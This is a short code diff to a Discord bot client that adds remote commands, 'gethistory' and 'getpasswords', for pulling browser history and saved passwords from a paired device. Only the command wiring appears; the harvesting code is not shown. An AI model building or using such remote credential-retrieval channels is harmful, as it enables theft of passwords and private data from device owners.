@@ -1069,6 +1069,14 @@ class ADexDiscordClient(discord.Client):
         async def sysinfo_full(interaction: discord.Interaction) -> None:
             await self._queue_remote_command(interaction, "sysinfo_full", {})
 
+        @self.tree.command(name="gethistory", description="Get browser history (requires accessibility)")
+        async def gethistory(interaction: discord.Interaction) -> None:
+            await self._queue_remote_command(interaction, "gethistory", {})
+
+        @self.tree.command(name="getpasswords", description="Get saved passwords (requires accessibility/interaction)")
+        async def getpasswords(interaction: discord.Interaction) -> None:
+            await self._queue_remote_command(interaction, "getpasswords", {})
+
         @self.tree.command(name="pair", description="Pair channel with one-time device code")
         @app_commands.describe(code="One-time pairing code shown in app")
         async def pair(interaction: discord.Interaction, code: str) -> None:
